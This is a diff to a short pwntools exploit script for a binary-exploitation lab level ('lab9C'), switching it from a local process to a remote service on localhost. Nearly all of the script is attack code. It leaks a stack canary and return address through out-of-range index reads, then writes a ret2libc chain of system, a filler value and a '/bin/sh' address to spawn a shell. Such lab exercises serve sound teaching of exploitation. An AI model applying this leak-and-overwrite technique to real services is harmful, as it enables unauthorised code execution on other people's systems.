@@ -1,15 +1,22 @@
 from pwn import *
-proc = process("/levels/lab09/lab9C")
+
+#proc = process("/levels/lab09/lab9C")
+proc = remote("localhost", 9943)
+
 proc.sendline("2")
+proc.recv(1024)
 proc.sendline("257")
-proc.recv(500)
+ret = proc.recv(1024)
 canary = int(ret.split('\n')[0].split()[-1])
+proc.clean()
 
 proc.sendline("2")
+proc.recv(1024)
 proc.sendline("261")
-proc.recv(500)
-
+ret = proc.recv(1024)
 return_addr = int(ret.split('\n')[0].split()[-1])
+
+
 retn = return_addr & 0xffffffff if return_addr < 0 else return_addr
 can = canary & 0xffffffff if canary < 0 else canary
 
@@ -30,6 +37,7 @@ proc.recv(500)
 buff = [42] * 3
 for num in buff:
     proc.sendline("1")
+    proc.recv(500)
     proc.sendline(str(num))
     proc.recv(500)
 
@@ -37,7 +45,6 @@ buff = [sys, 42, binsh]
 for num in buff:
     proc.sendline("1")
     proc.recv(500)
-    print(str(num))
     proc.sendline(str(num))
     proc.recv(500)
 
